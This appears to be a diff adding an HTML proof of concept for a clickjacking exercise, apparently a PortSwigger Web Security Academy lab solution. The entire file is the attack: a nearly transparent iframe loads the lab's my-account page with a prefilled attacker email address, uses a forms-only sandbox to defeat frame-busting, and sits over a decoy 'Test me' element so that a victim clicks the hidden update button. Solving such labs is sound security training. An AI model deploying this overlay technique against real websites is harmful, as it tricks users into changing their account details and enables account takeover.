@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    
+</head>
+<body>
+    
+    <style>
+        iframe {
+            position:relative;
+            width:500px;
+            height: 700px;
+            opacity: 0.1;
+            z-index: 2;
+        }
+        div {
+            position:absolute;
+            top:385px;
+            left:80px;
+            z-index: 1;
+        }
+    </style>
+    <div>Test me</div>
+    <iframe sandbox="allow-forms"
+    src="https://ac121f1d1f8721f5c03226fb00970051.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+        
+    
+</body>
+</html>
